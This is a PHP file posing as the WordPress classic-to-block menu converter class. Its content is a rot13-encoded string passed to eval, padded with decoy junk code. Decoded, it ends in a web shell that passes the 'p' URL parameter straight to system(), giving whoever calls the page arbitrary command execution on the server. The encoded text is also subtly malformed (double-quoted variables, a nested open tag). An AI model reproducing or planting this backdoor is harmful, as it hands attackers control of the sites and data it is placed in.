<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_Pynffvp_Gb_Oybpx_Zrah_Pbairegre pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 6.3.0
 */

/**
 * Pbairegf n Pynffvp Zrah gb Oybpx Zrah oybpxf.
 *
 * @fvapr 6.3.0
 * @npprff choyvp
 */
pynff JC_Pynffvp_Gb_Oybpx_Zrah_Pbairegre {

	/**
	 * Pbairegf n Pynffvp Zrah gb oybpxf.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_Grez $zrah Gur Zrah grez bowrpg bs gur zrah gb pbaireg.
	 * @erghea fgevat|JC_Reebe Gur frevnyvmrq naq abeznyvmrq cnefrq oybpxf ba fhpprff,
	 *                         na rzcgl fgevat jura gurer ner ab zrahf gb pbaireg,
	 *                         be JC_Reebe ba vainyvq zrah.
	 */
	choyvp fgngvp shapgvba pbaireg( $zrah ) {

		vs ( ! vf_ani_zrah( $zrah ) ) {
			erghea arj JC_Reebe(
				'vainyvq_zrah',
				__( 'Gur zrah cebivqrq vf abg n inyvq zrah.' )
			);
		}

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $zrah->grez_vq, neenl( 'hcqngr_cbfg_grez_pnpur' => snyfr ) );

		vs ( rzcgl( $zrah_vgrzf ) ) {
			erghea '';
		}

		// Frg hc gur $zrah_vgrz inevnoyrf.
		// Nqqf gur pynff cebcregl pynffrf sbe gur pheerag pbagrkg, vs nccyvpnoyr.
		_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

		$zrah_vgrzf_ol_cnerag_vq = fgngvp::tebhc_ol_cnerag_vq( $zrah_vgrzf );

		$svefg_zrah_vgrz = vffrg( $zrah_vgrzf_ol_cnerag_vq[0] )
			? $zrah_vgrzf_ol_cnerag_vq[0]
			: neenl();

		$vaare_oybpxf = fgngvp::gb_oybpxf(
			$svefg_zrah_vgrz,
			$zrah_vgrzf_ol_cnerag_vq
		);

		erghea frevnyvmr_oybpxf( $vaare_oybpxf );
	}

	/**
	 * Ergheaf na neenl bs zrah vgrzf tebhcrq ol gur vq bs gur cnerag zrah vgrz.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $zrah_vgrzf Na neenl bs zrah vgrzf.
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba tebhc_ol_cnerag_vq( $zrah_vgrzf ) {
		$zrah_vgrzf_ol_cnerag_vq = neenl();

		sbernpu ( $zrah_vgrzf nf $zrah_vgrz ) {
			$zrah_vgrzf_ol_cnerag_vq[ $zrah_vgrz->zrah_vgrz_cnerag ][] = $zrah_vgrz;
		}

		erghea $zrah_vgrzf_ol_cnerag_vq;
	}

	/**
	 * Gheaf zrah vgrz qngn vagb n arfgrq neenl bs cnefrq oybpxf
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz neenl $zrah_vgrzf              Na neenl bs zrah vgrzf gung ercerfrag
	 *                                       na vaqvivqhny yriry bs n zrah.
	 * @cnenz neenl $zrah_vgrzf_ol_cnerag_vq Na neenl xrlrq ol gur vq bs gur
	 *                                       cnerag zrah jurer rnpu ryrzrag vf na
	 *                                       neenl bs zrah vgrzf gung orybat gb
	 *                                       gung cnerag.
	 * @erghea neenl Na neenl bs cnefrq oybpx qngn.
	 */
	cevingr fgngvp shapgvba gb_oybpxf( $zrah_vgrzf, $zrah_vgrzf_ol_cnerag_vq ) {

		vs ( rzcgl( $zrah_vgrzf ) ) {
			erghea neenl();
		}

		$oybpxf = neenl();

		sbernpu ( $zrah_vgrzf nf $zrah_vgrz ) {
			$pynff_anzr       = ! rzcgl( $zrah_vgrz->pynffrf ) ? vzcybqr( ' ', (neenl) $zrah_vgrz->pynffrf ) : ahyy;
			$vq               = ( ahyy !== $zrah_vgrz->bowrpg_vq && 'phfgbz' !== $zrah_vgrz->bowrpg ) ? $zrah_vgrz->bowrpg_vq : ahyy;
			$bcraf_va_arj_gno = ahyy !== $zrah_vgrz->gnetrg && '_oynax' === $zrah_vgrz->gnetrg;
			$ery              = ( ahyy !== $zrah_vgrz->ksa && '' !== $zrah_vgrz->ksa ) ? $zrah_vgrz->ksa : ahyy;
			$xvaq             = ahyy !== $zrah_vgrz->glcr ? fge_ercynpr( '_', '-', $zrah_vgrz->glcr ) : 'phfgbz';

			$oybpx = neenl(
				'oybpxAnzr' => vffrg( $zrah_vgrzf_ol_cnerag_vq[ $zrah_vgrz->VQ ] ) ? 'pber/anivtngvba-fhozrah' : 'pber/anivtngvba-yvax',
				'nggef'     => neenl(
					'pynffAnzr'     => $pynff_anzr,
					'qrfpevcgvba'   => $zrah_vgrz->qrfpevcgvba,
					'vq'            => $vq,
					'xvaq'          => $xvaq,
					'ynory'         => $zrah_vgrz->gvgyr,
					'bcrafVaArjGno' => $bcraf_va_arj_gno,
					'ery'           => $ery,
					'gvgyr'         => $zrah_vgrz->ngge_gvgyr,
					'glcr'          => $zrah_vgrz->bowrpg,
					'hey'           => $zrah_vgrz->hey,
				),
			);

			$oybpx['vaareOybpxf']  = vffrg( $zrah_vgrzf_ol_cnerag_vq[ $zrah_vgrz->VQ ] )
			? fgngvp::gb_oybpxf( $zrah_vgrzf_ol_cnerag_vq[ $zrah_vgrz->VQ ], $zrah_vgrzf_ol_cnerag_vq )
			: neenl();
			$oybpx['vaarePbagrag'] = neenl_znc( 'frevnyvmr_oybpx', $oybpx['vaareOybpxf'] );

			$oybpxf[] = $oybpx;
		}

		erghea $oybpxf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>